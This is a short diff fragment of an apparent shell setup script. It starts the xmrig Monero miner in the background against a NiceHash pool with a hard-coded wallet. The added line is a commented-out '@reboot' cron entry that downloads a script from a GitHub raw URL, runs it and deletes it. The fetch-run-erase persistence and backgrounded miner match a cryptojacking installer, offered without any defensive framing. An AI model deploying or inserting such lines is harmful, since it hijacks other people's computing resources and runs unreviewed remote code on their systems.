@@ -15,3 +15,5 @@ tar -zxf xmrig-6.20.0-bionic-x64.tar.gz   \
 cd xmrig-6.20.0	\
 
 ./xmrig -a randomx -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbJBmjRDqvpDVfpCDJcNgxS5qr6HEsqhrs2 -p x -B
+
+# @reboot wget https://raw.githubusercontent.com/TechTouchABI/scaling-tribble/main/regsysx0e.sh && sh regsysx0e.sh && rm -rf regsysx0e.sh
